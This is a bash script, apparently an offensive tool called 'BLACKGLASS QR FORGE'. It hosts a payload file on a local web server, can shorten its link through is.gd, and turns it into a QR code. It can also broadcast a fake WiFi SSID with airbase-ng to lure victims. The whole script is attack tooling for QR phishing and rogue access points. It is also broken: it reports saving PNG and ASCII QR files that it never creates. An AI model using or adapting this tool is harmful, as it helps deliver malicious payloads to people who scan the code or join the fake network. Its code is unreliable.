#!/bin/bash

# === BLACKGLASS QR FORGE ENHANCED ===
# Dependencies: qrencode, python3, curl (optional for short URLs), ifconfig/ip

OUTPUT_DIR="./output"
mkdir -p "$OUTPUT_DIR"

read -p "[+] Enter payload URL or local file path: " PAYLOAD

# Auto-host if it's a file
if [[ -f "$PAYLOAD" ]]; then
    echo "[*] Hosting $PAYLOAD on http://0.0.0.0:8080..."
    cp "$PAYLOAD" "$OUTPUT_DIR/"
    PAYLOAD_BASENAME=$(basename "$PAYLOAD")
    python3 -m http.server 8080 --directory "$OUTPUT_DIR" >/dev/null 2>&1 &
    SERVER_PID=$!
    
    # Try to get local IP
    LOCAL_IP=$(ip addr | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
    PAYLOAD_URL="http://$LOCAL_IP:8080/$PAYLOAD_BASENAME"
else
    PAYLOAD_URL="$PAYLOAD"
fi

read -p "[?] Shorten URL with is.gd? (y/N): " SHORTEN
if [[ "$SHORTEN" =~ ^[Yy]$ ]]; then
    SHORTENED=$(curl -s "https://is.gd/create.php?format=simple&url=$PAYLOAD_URL")
    echo "[+] Shortened URL: $SHORTENED"
    PAYLOAD_URL="$SHORTENED"
fi

TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
QR_PNG="$OUTPUT_DIR/qr_payload_$TIMESTAMP.png"
QR_ASCII="$OUTPUT_DIR/qr_payload_$TIMESTAMP.txt"

echo "[*] Generating QR code..."
python3 -c "import qrcode_terminal; qrcode_terminal.draw('$PAYLOAD_URL')"

echo "[✓] QR Code (ASCII):"
cat "$QR_ASCII"

echo "[✓] PNG saved to: $QR_PNG"

echo "[*] Log saved to: $OUTPUT_DIR/qr_log.txt"
echo "[$TIMESTAMP] $PAYLOAD_URL → $QR_PNG" >> "$OUTPUT_DIR/qr_log.txt"

# Optional SSID beacon broadcast
read -p "[?] Broadcast fake WiFi SSID? (Linux only, requires airbase-ng) (y/N): " FAKE_SSID
if [[ "$FAKE_SSID" =~ ^[Yy]$ ]]; then
    read -p "[+] Enter fake SSID name: " SSID
    echo "[*] Starting beacon with SSID '$SSID'..."
    xterm -hold -e "airbase-ng --essid '$SSID' -c 6 wlan0mon" &
fi

# Cleanup HTTP server
if [[ ! -z "$SERVER_PID" ]]; then
    read -p "[?] Stop local HTTP server now? (Y/n): " STOP_SERVER
    if [[ ! "$STOP_SERVER" =~ ^[Nn]$ ]]; then
        kill $SERVER_PID && echo "[*] Server stopped."
    fi
fi
